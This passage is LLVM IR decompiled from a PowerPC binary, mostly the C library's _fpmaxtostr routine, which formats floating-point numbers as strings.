  %v0_10010cf4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010cec

dec_label_pc_10010ce4:                            ; preds = %dec_label_pc_10010cdc
  %v2_10010ce8 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010ce8 = add i32 %v2_10010ce8, -1
  %v4_10010ce8 = inttoptr i32 %v3_10010ce8 to i8*
  store i8 45, i8* %v4_10010ce8, align 1
  store i32 %v3_10010ce8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010cec

dec_label_pc_10010cec:                            ; preds = %dec_label_pc_10010cdc.dec_label_pc_10010cec_crit_edge, %dec_label_pc_10010ce4
  %v0_10010cf4 = phi i32 [ %v0_10010cf4.pre, %dec_label_pc_10010cdc.dec_label_pc_10010cec_crit_edge ], [ %v3_10010ce8, %dec_label_pc_10010ce4 ]
  ret i32 %v0_10010cf4

; uselistorder directives
  uselistorder i32 %v2_10010c6c, { 1, 2, 0 }
  uselistorder i32 %v2_10010c64, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10010ca8, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10010c44, { 1, 2, 0 }
  uselistorder i32 %v0_10010c44, { 1, 0 }
  uselistorder i32 %v0_10010c00, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_10010cec, { 1, 0 }
  uselistorder label %dec_label_pc_10010cb4, { 1, 0 }
  uselistorder label %dec_label_pc_10010c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10010c34, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10010cf8 = load i32, i32* @lr, align 4
  store i32 %v0_10010cf8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10010d14 = add i32 %tmp, 11
  %v2_10010d14 = inttoptr i32 %v1_10010d14 to i8*
  %v3_10010d14 = load i8, i8* %v2_10010d14, align 1
  %v4_10010d14 = zext i8 %v3_10010d14 to i32
  store i32 %v4_10010d14, i32* %r31.global-to-local, align 4
  %v1_10010d18 = or i32 %v4_10010d14, 32
  %v1_10010d1c = icmp ult i32 %v1_10010d18, 97
  %v3_10010d1c = icmp eq i32 %v1_10010d18, 97
  store i1 %v1_10010d1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010d1c, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_10010d28 = add i32 %tmp, 4
  %v2_10010d28 = inttoptr i32 %v1_10010d28 to i32*
  %v3_10010d28 = load i32, i32* %v2_10010d28, align 4
  store i32 %v3_10010d28, i32* %r28.global-to-local, align 4
  %v2_10010d2c = load i32, i32* %arg2, align 4
  store i32 %v2_10010d2c, i32* %r30.global-to-local, align 4
  br i1 %v3_10010d1c, label %dec_label_pc_10010d34, label %dec_label_pc_10010d3c

dec_label_pc_10010d34:                            ; preds = %entry
  %v1_10010d34 = add nuw nsw i32 %v4_10010d14, 6
  store i32 %v1_10010d34, i32* %r0.global-to-local, align 4
  %v1_10010d38 = urem i32 %v1_10010d34, 256
  store i32 %v1_10010d38, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010d3c

dec_label_pc_10010d3c:                            ; preds = %entry, %dec_label_pc_10010d34
  %v0_10010df0 = phi i32 [ %v4_10010d14, %entry ], [ %v1_10010d38, %dec_label_pc_10010d34 ]
  %v1_10010d3c = icmp slt i32 %v2_10010d2c, 0
  %v3_10010d3c = icmp eq i32 %v2_10010d2c, 0
  store i1 %v1_10010d3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010d3c, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10010d2c, -1
  br i1 %tmp75, label %dec_label_pc_10010d48, label %dec_label_pc_10010d44

dec_label_pc_10010d44:                            ; preds = %dec_label_pc_10010d3c
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010d48

dec_label_pc_10010d48:                            ; preds = %dec_label_pc_10010d3c, %dec_label_pc_10010d44
  %v0_10010f0044 = phi i32 [ %v2_10010d2c, %dec_label_pc_10010d3c ], [ 6, %dec_label_pc_10010d44 ]
  %v1_10010d48 = add i32 %tmp, 12
  %v2_10010d48 = inttoptr i32 %v1_10010d48 to i32*
  %v3_10010d48 = load i32, i32* %v2_10010d48, align 4
  store i32 %v3_10010d48, i32* %r9.global-to-local, align 4
  %v1_10010d4c = and i32 %v3_10010d48, 2
  %v3_10010d4c = icmp eq i32 %v1_10010d4c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_10010d4c, label %dec_label_pc_10010d64, label %dec_label_pc_10010d70

dec_label_pc_10010d64:                            ; preds = %dec_label_pc_10010d48
  %v1_10010d64 = urem i32 %v3_10010d48, 2
  store i32 %v1_10010d64, i32* @r7, align 4
  %v3_10010d64 = icmp eq i32 %v1_10010d64, 0
  br i1 %v3_10010d64, label %dec_label_pc_10010d74, label %dec_label_pc_10010d70

dec_label_pc_10010d70:                            ; preds = %dec_label_pc_10010d64, %dec_label_pc_10010d48
  %storemerge = phi i32 [ 43, %dec_label_pc_10010d48 ], [ 32, %dec_label_pc_10010d64 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10010d70 = trunc i32 %storemerge to i8
  store i8 %v6_10010d70, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10010d74

dec_label_pc_10010d74:                            ; preds = %dec_label_pc_10010d64, %dec_label_pc_10010d70
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10010d3c, label %dec_label_pc_10010ed8, label %dec_label_pc_10010df0

dec_label_pc_10010df0:                            ; preds = %dec_label_pc_10010d74
  %v1_10010df0 = icmp ult i32 %v0_10010df0, 96
  %v2_10010df0 = icmp ugt i32 %v0_10010df0, 96
  %v3_10010df0 = icmp eq i32 %v0_10010df0, 96
  store i1 %v1_10010df0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010df0, i1* %cr7_eq.global-to-local, align 1
  %v2_10010df8 = add i32 %tmp, 16
  %v3_10010df8 = inttoptr i32 %v2_10010df8 to i32*
  store i32 32, i32* %v3_10010df8, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10010df0, label %dec_label_pc_10010e1c, label %dec_label_pc_10010e10

dec_label_pc_10010e10:                            ; preds = %dec_label_pc_10010df0
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10010e1c

dec_label_pc_10010e1c:                            ; preds = %dec_label_pc_10010df0, %dec_label_pc_10010e10
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1001a460.798 to i32), i32 8), %dec_label_pc_10010df0 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1001a460.798 to i32), i32 12), %dec_label_pc_10010e10 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1001a460.798 to i32), i32* %r9.global-to-local, align 4
  %v2_10010e28 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10010e28, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100112c8

dec_label_pc_10010ed8:                            ; preds = %dec_label_pc_10010d74
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10010edc = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10010edc, i32* %r6.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10010f28 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10010efc

dec_label_pc_10010efc:                            ; preds = %dec_label_pc_10010f7c.dec_label_pc_10010efc_crit_edge, %dec_label_pc_10010ed8
  %v0_10010f00 = phi i32 [ %v0_10010f00.pre, %dec_label_pc_10010f7c.dec_label_pc_10010efc_crit_edge ], [ %v0_10010f0044, %dec_label_pc_10010ed8 ]
  %v3_10010f00 = call %0 @__asm_cror(i32 %v0_10010f00, i32 %tmp, i32 %v0_10010f00)
  %v11_10010f00 = extractvalue %0 %v3_10010f00, 7
  store i4 %v11_10010f00, i4* @cr4, align 1
  %v0_10010f04 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10010f04, label %dec_label_pc_10010f18, label %dec_label_pc_10010f2c

dec_label_pc_10010f18:                            ; preds = %dec_label_pc_10010efc
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010f2c

dec_label_pc_10010f2c:                            ; preds = %dec_label_pc_10010efc, %dec_label_pc_10010f18
  %storemerge2 = phi i32 [ %v1_10010f28, %dec_label_pc_10010f18 ], [ %tmp55, %dec_label_pc_10010efc ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10010f3c = load i32, i32* %r6.global-to-local, align 4
  %v1_10010f3c = add i32 %v0_10010f3c, 9
  store i32 %v1_10010f3c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010f58

dec_label_pc_10010f58:                            ; preds = %dec_label_pc_10010f58.dec_label_pc_10010f58_crit_edge, %dec_label_pc_10010f2c
  %v1_10010f60 = phi i32 [ %v1_10010f60.pre, %dec_label_pc_10010f58.dec_label_pc_10010f58_crit_edge ], [ %v1_10010f3c, %dec_label_pc_10010f2c ]
  %v0_10010f5c = phi i32 [ %v0_10010f5c.pre, %dec_label_pc_10010f58.dec_label_pc_10010f58_crit_edge ], [ 0, %dec_label_pc_10010f2c ]
  %v1_10010f58 = phi i32 [ %v1_10010f58.pre, %dec_label_pc_10010f58.dec_label_pc_10010f58_crit_edge ], [ 10, %dec_label_pc_10010f2c ]
  %v1_10010f68 = phi i32 [ %v0_10010f58.pre, %dec_label_pc_10010f58.dec_label_pc_10010f58_crit_edge ], [ %storemerge2, %dec_label_pc_10010f2c ]
  %v2_10010f58 = udiv i32 %v1_10010f68, %v1_10010f58
  store i32 %v2_10010f58, i32* %r0.global-to-local, align 4
  %v1_10010f5c = add i32 %v0_10010f5c, 1
  store i32 %v1_10010f5c, i32* %r8.global-to-local, align 4
  %v2_10010f60 = sub i32 %v1_10010f60, %v1_10010f5c
  store i32 %v2_10010f60, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10010f58, -10
  store i32 %v2_10010f58, i32* %r10.global-to-local, align 4
  %v2_10010f68 = add i32 %v1_10010f68, 48
  %v1_10010f70 = add i32 %v2_10010f68, %tmp76
  store i32 %v1_10010f70, i32* %r9.global-to-local, align 4
  %v1_10010f74 = trunc i32 %v1_10010f70 to i8
  %v3_10010f74 = inttoptr i32 %v2_10010f60 to i8*
  store i8 %v1_10010f74, i8* %v3_10010f74, align 1
  %v0_10010f78 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010f78 = add i32 %v0_10010f78, -1
  store i32 %v1_10010f78, i32* %ctr.global-to-local, align 4
  %v2_10010f78 = icmp eq i32 %v1_10010f78, 0
  br i1 %v2_10010f78, label %dec_label_pc_10010f7c, label %dec_label_pc_10010f58.dec_label_pc_10010f58_crit_edge

dec_label_pc_10010f58.dec_label_pc_10010f58_crit_edge: ; preds = %dec_label_pc_10010f58
  %v0_10010f58.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10010f58.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10010f5c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10010f60.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010f58

dec_label_pc_10010f7c:                            ; preds = %dec_label_pc_10010f58
  %v0_10010f7c = load i32, i32* %r7.global-to-local, align 4
  %v1_10010f7c = icmp slt i32 %v0_10010f7c, 0
  %v3_10010f7c = icmp eq i32 %v0_10010f7c, 0
  store i1 %v1_10010f7c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010f7c, i1* %cr7_eq.global-to-local, align 1
  %v1_10010f80 = add i32 %v0_10010f7c, 1
  store i32 %v1_10010f80, i32* %r7.global-to-local, align 4
  br i1 %v3_10010f7c, label %dec_label_pc_10010f7c.dec_label_pc_10010efc_crit_edge, label %dec_label_pc_10010f88

dec_label_pc_10010f7c.dec_label_pc_10010efc_crit_edge: ; preds = %dec_label_pc_10010f7c
  %v0_10010f00.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010efc

dec_label_pc_10010f88:                            ; preds = %dec_label_pc_10010f7c
  %v0_10010f88 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010f88 = icmp ult i32 %v0_10010f88, 96
  %v2_10010f88 = icmp ugt i32 %v0_10010f88, 96
  %v3_10010f88 = icmp eq i32 %v0_10010f88, 96
  store i1 %v1_10010f88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010f88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10010f88, label %dec_label_pc_10010fa0, label %dec_label_pc_10010f90

dec_label_pc_10010f90:                            ; preds = %dec_label_pc_10010f88
  %v1_10010f98 = add i32 %v0_10010f88, 32
  store i32 %v1_10010f98, i32* %r0.global-to-local, align 4
  %v1_10010f9c = urem i32 %v1_10010f98, 256
  store i32 %v1_10010f9c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010fa0

dec_label_pc_10010fa0:                            ; preds = %dec_label_pc_10010f88, %dec_label_pc_10010f90
  %v0_10010fb8 = phi i32 [ %v1_10010f9c, %dec_label_pc_10010f90 ], [ %v0_10010f88, %dec_label_pc_10010f88 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10010f90 ], [ 101, %dec_label_pc_10010f88 ]
  %v1_10010fa0 = icmp slt i32 %v0_10010fb8, 103
  %v3_10010fa0 = icmp eq i32 %v0_10010fb8, 103
  store i1 %v1_10010fa0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fa0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010fa0, label %dec_label_pc_10010fa8, label %dec_label_pc_10010fb8

dec_label_pc_10010fa8:                            ; preds = %dec_label_pc_10010fa0
  %v0_10010fa8 = load i32, i32* %r30.global-to-local, align 4
  %v1_10010fa8 = icmp slt i32 %v0_10010fa8, 0
  %v3_10010fa8 = icmp eq i32 %v0_10010fa8, 0
  store i1 %v1_10010fa8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fa8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010fa8, label %dec_label_pc_10010fc0, label %dec_label_pc_10010fb0

dec_label_pc_10010fb0:                            ; preds = %dec_label_pc_10010fa8
  %v1_10010fb0 = add i32 %v0_10010fa8, -1
  store i32 %v1_10010fb0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010fc0

dec_label_pc_10010fb8:                            ; preds = %dec_label_pc_10010fa0
  %v1_10010fb8 = icmp slt i32 %v0_10010fb8, 102
  %v3_10010fb8 = icmp eq i32 %v0_10010fb8, 102
  store i1 %v1_10010fb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fb8, i1* %cr7_eq.global-to-local, align 1
  %v0_10010fc8 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10010fb8, label %dec_label_pc_10010fc8, label %dec_label_pc_10010fc0

dec_label_pc_10010fc0:                            ; preds = %dec_label_pc_10010fb8, %dec_label_pc_10010fa8, %dec_label_pc_10010fb0
  %v0_10010fc0 = phi i32 [ 0, %dec_label_pc_10010fa8 ], [ %v1_10010fb0, %dec_label_pc_10010fb0 ], [ %v0_10010fc8, %dec_label_pc_10010fb8 ]
  store i32 %v0_10010fc0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010fec

dec_label_pc_10010fc8:                            ; preds = %dec_label_pc_10010fb8
  %v1_10010fc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_10010fc8 = add i32 %v1_10010fc8, %v0_10010fc8
  store i32 %v2_10010fc8, i32* %r10.global-to-local, align 4
  %v1_10010fcc = icmp slt i32 %v2_10010fc8, -1
  %v3_10010fcc = icmp eq i32 %v2_10010fc8, -1
  store i1 %v1_10010fcc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fcc, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10010fc8, -2
  br i1 %tmp77, label %dec_label_pc_10010fec, label %dec_label_pc_10010fd4

dec_label_pc_10010fd4:                            ; preds = %dec_label_pc_10010fc8
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_10010fd8 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10010fd8, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268505060, i32* @lr, align 4
  %v3_10010fe0 = call i32 @__GI_memset(i32 %v2_10010fd8, i32 48, i32 17)
  store i32 %v3_10010fe0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010fec

dec_label_pc_10010fec:                            ; preds = %dec_label_pc_10010fc8, %dec_label_pc_10010fc0, %dec_label_pc_10010fd4
  %v1_10011010 = phi i32 [ %v2_10010fc8, %dec_label_pc_10010fc8 ], [ %v0_10010fc0, %dec_label_pc_10010fc0 ], [ -1, %dec_label_pc_10010fd4 ]
  %v1_10010fec = icmp slt i32 %v1_10011010, 16
  %v2_10010fec = icmp sgt i32 %v1_10011010, 16
  %v3_10010fec = icmp eq i32 %v1_10011010, 16
  store i1 %v1_10010fec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fec, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10011000 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10011000, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10010fec, label %dec_label_pc_10011028, label %dec_label_pc_1001100c

dec_label_pc_1001100c:                            ; preds = %dec_label_pc_10010fec
  %v2_1001100c = ptrtoint i32* %stack_var_-177 to i32
  %v2_10011010 = add i32 %v1_10011010, %v2_1001100c
  store i32 %v2_10011010, i32* %r9.global-to-local, align 4
  %v1_10011014 = add i32 %v2_10011010, 2
  %v2_10011014 = inttoptr i32 %v1_10011014 to i8*
  %v3_10011014 = load i8, i8* %v2_10011014, align 1
  %v4_10011014 = zext i8 %v3_10011014 to i32
  store i32 %v4_10011014, i32* %r0.global-to-local, align 4
  store i32 %v1_10011014, i32* %r11.global-to-local, align 4
  %v1_1001101c = sub nsw i32 52, %v4_10011014
  %v2_1001101c = sub nuw nsw i32 -1, %v4_10011014
  %not.v5_1001101c = icmp ugt i32 %v1_1001101c, %v2_1001101c
  %v1_10011024 = zext i1 %not.v5_1001101c to i32
  store i32 %v1_10011024, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011028

dec_label_pc_10011028:                            ; preds = %dec_label_pc_10010fec, %dec_label_pc_1001100c, %dec_label_pc_10011028.backedge
  %v0_1001102c = phi i32 [ %v0_1001102c.pre, %dec_label_pc_10011028.backedge ], [ 0, %dec_label_pc_10010fec ], [ %v1_10011024, %dec_label_pc_1001100c ]
  %v0_10011028 = phi i32 [ %v0_10011028.pre, %dec_label_pc_10011028.backedge ], [ %v2_10011000, %dec_label_pc_10010fec ], [ %v1_10011014, %dec_label_pc_1001100c ]
  %v1_10011028 = add i32 %v0_10011028, -1
  %v2_10011028 = inttoptr i32 %v1_10011028 to i8*
  %v3_10011028 = load i8, i8* %v2_10011028, align 1
  %v4_10011028 = zext i8 %v3_10011028 to i32
  store i32 %v1_10011028, i32* %r11.global-to-local, align 4
  %v2_1001102c = add i32 %v4_10011028, %v0_1001102c
  store i32 %v2_1001102c, i32* %r0.global-to-local, align 4
  %v1_10011030 = urem i32 %v2_1001102c, 256
  store i32 %v1_10011030, i32* %r9.global-to-local, align 4
  %v1_10011034 = trunc i32 %v2_1001102c to i8
  store i8 %v1_10011034, i8* %v2_10011028, align 1
  %v0_10011038 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011038 = icmp slt i32 %v0_10011038, 48
  %v3_10011038 = icmp eq i32 %v0_10011038, 48
  store i1 %v1_10011038, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011038, i1* %cr7_eq.global-to-local, align 1
  %v1_1001103c = icmp ult i32 %v0_10011038, 57
  %v2_1001103c = icmp ugt i32 %v0_10011038, 57
  %v3_1001103c = icmp eq i32 %v0_10011038, 57
  store i1 %v1_1001103c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1001103c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1001103c, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10011038, %v2_1001103c
  br i1 %brmerge, label %dec_label_pc_10011028.backedge, label %dec_label_pc_10011048

dec_label_pc_10011028.backedge:                   ; preds = %dec_label_pc_10011028
  %v0_10011028.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1001102c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011028

dec_label_pc_10011048:                            ; preds = %dec_label_pc_10011028
  %v2_10011048 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10011048, i32* %r0.global-to-local, align 4
  %v0_1001104c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1001104c, i32* @r7, align 4
  %v0_10011050 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011050 = icmp ult i32 %v0_10011050, %v2_10011048
  %v3_10011050 = icmp ugt i32 %v0_10011050, %v2_10011048
  %v4_10011050 = icmp eq i32 %v0_10011050, %v2_10011048
  store i1 %v2_10011050, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011050, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10010edc, i32* %r8.global-to-local, align 4
  br i1 %v3_10011050, label %dec_label_pc_10011068, label %dec_label_pc_1001105c

dec_label_pc_1001105c:                            ; preds = %dec_label_pc_10011048
  store i32 %v2_10011048, i32* %r8.global-to-local, align 4
  %v1_10011060 = add i32 %v0_1001104c, 1
  store i32 %v1_10011060, i32* @r7, align 4
  store i32 %v2_10011048, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011068

dec_label_pc_10011068:                            ; preds = %dec_label_pc_10011048, %dec_label_pc_1001105c
  %v2_10011070 = phi i32 [ %v0_10011050, %dec_label_pc_10011048 ], [ %v2_10011048, %dec_label_pc_1001105c ]
  %v0_10011068 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011068 = icmp slt i32 %v0_10011068, 103
  %v3_10011068 = icmp eq i32 %v0_10011068, 103
  store i1 %v1_10011068, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011068, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10011070 = add i32 %v2_10011070, 1
  %v4_10011070 = inttoptr i32 %v3_10011070 to i8*
  store i8 0, i8* %v4_10011070, align 1
  %v0_10011074 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011074 = add i32 %v0_10011074, 1
  store i32 %v1_10011074, i32* %r9.global-to-local, align 4
  %v0_10011078 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10011078, label %dec_label_pc_1001107c, label %dec_label_pc_100110a0

dec_label_pc_1001107c:                            ; preds = %dec_label_pc_10011068
  %v0_1001107c = load i32, i32* @r7, align 4
  %v1_1001107c = icmp slt i32 %v0_1001107c, -4
  %v3_1001107c = icmp eq i32 %v0_1001107c, -4
  store i1 %v1_1001107c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001107c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1001107c, label %dec_label_pc_10011098, label %dec_label_pc_10011084

dec_label_pc_10011084:                            ; preds = %dec_label_pc_1001107c
  %v1_10011084 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011084 = icmp sgt i32 %v1_10011084, %v0_1001107c
  %v3_10011084 = icmp slt i32 %v1_10011084, %v0_1001107c
  %v4_10011084 = icmp eq i32 %v1_10011084, %v0_1001107c
  store i1 %v2_10011084, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011084, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011084, label %dec_label_pc_10011098, label %dec_label_pc_1001108c

dec_label_pc_1001108c:                            ; preds = %dec_label_pc_10011084
  %v2_1001108c = sub i32 %v1_10011084, %v0_1001107c
  store i32 %v2_1001108c, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100110b8

dec_label_pc_10011098:                            ; preds = %dec_label_pc_10011084, %dec_label_pc_1001107c
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100110ac

dec_label_pc_100110a0:                            ; preds = %dec_label_pc_10011068
  %v0_100110a0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100110a0 = icmp slt i32 %v0_100110a0, 102
  %v3_100110a0 = icmp eq i32 %v0_100110a0, 102
  store i1 %v1_100110a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100110a0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100110a0, i32* %r4.global-to-local, align 4
  br i1 %v3_100110a0, label %dec_label_pc_100110b8thread-pre-split, label %dec_label_pc_100110ac

dec_label_pc_100110ac:                            ; preds = %dec_label_pc_100110a0, %dec_label_pc_10011098
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_100110cc

dec_label_pc_100110b8thread-pre-split:            ; preds = %dec_label_pc_100110a0
  %v0_100110b8.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_100110b8

dec_label_pc_100110b8:                            ; preds = %dec_label_pc_100110b8thread-pre-split, %dec_label_pc_1001108c
  %v0_100110bc = phi i32 [ %v0_100110b8.pr, %dec_label_pc_100110b8thread-pre-split ], [ %v0_1001107c, %dec_label_pc_1001108c ]
  %v1_100110b8 = icmp slt i32 %v0_100110bc, 0
  %v2_100110b8 = icmp sgt i32 %v0_100110bc, 0
  %v3_100110b8 = icmp eq i32 %v0_100110bc, 0
  store i1 %v1_100110b8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100110b8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100110b8, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_100110bc, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_100110bc, -1
  br i1 %tmp78, label %dec_label_pc_100110cc, label %dec_label_pc_100110c4

dec_label_pc_100110c4:                            ; preds = %dec_label_pc_100110b8
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_100110c8 = load i32, i32* %r8.global-to-local, align 4
  %v3_100110c8 = add i32 %v2_100110c8, -1
  %v4_100110c8 = inttoptr i32 %v3_100110c8 to i8*
  store i8 48, i8* %v4_100110c8, align 1
  store i32 %v3_100110c8, i32* %r8.global-to-local, align 4
  %v1_100110e8.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100110fc.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_100110cc

dec_label_pc_100110cc:                            ; preds = %dec_label_pc_100110b8, %dec_label_pc_100110ac, %dec_label_pc_100110c4
